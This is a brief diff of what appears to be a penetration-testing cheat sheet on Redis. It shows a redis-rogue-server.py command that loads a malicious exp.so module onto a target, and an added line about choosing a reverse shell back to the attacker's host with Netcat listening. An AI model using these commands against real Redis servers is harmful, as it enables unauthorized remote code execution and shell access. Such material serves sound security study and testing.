@@ -1765,6 +1765,8 @@ If password required:
 bash
 
     ./redis-rogue-server.py --rhost <MIP> --lhost <VIP> --lport=6379 --exp exp.so
+
+to get the shell typr: r and then enter your <VIP> and port and start Netcat on the same
 redis-cli -h <IP> -p 6379 -a <password>
 Gather Information
 Inside redis-cli:
